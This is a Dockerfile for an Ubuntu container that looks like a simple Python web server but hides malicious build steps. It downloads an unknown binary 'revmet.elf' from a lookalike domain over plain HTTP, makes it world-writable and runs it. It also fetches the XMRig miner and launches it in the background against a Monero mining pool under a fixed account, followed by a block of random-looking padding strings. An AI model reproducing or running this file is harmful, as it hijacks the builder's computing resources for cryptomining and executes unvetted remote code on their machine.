FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo gAzAKcAOVXuIQJ9kPwYWfZspvY1axwIB llg0Yl7TNdeWtCQ7rVKTjYJSyb0QdOwh WbkoT9pF7fRPyzqdn1JmMIv2Szkf86TY Fiukglh3d5iALOBtixMe2OLwHc6ravhh vN4H7bPyrCoNzJZadsPuFRQcjF4LW4Gf qeE8cLyirZvCIqgRKMHxlsgG4QDcDqoT ONTK4BqVW4FLPnckZWmP4zrs5YCvOK8Z QdR0uB4t5viSbmnUuwXGqQe12f0MVuX1 BvoVv9fk5lVAxlTcUz75aaB0Z4VziXXk aCLRANHVWS6QvFkUL3q0jydkEE04Gl43 5fDO2Vazv8rHROMlcnmkxduuU3yRDP7M gcTmGKktWWp5q6hJR9O1QcMLOCepKcf8 RHYAuKpa81XC4ZMQ7j4ONbyWkiXzfAxt DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]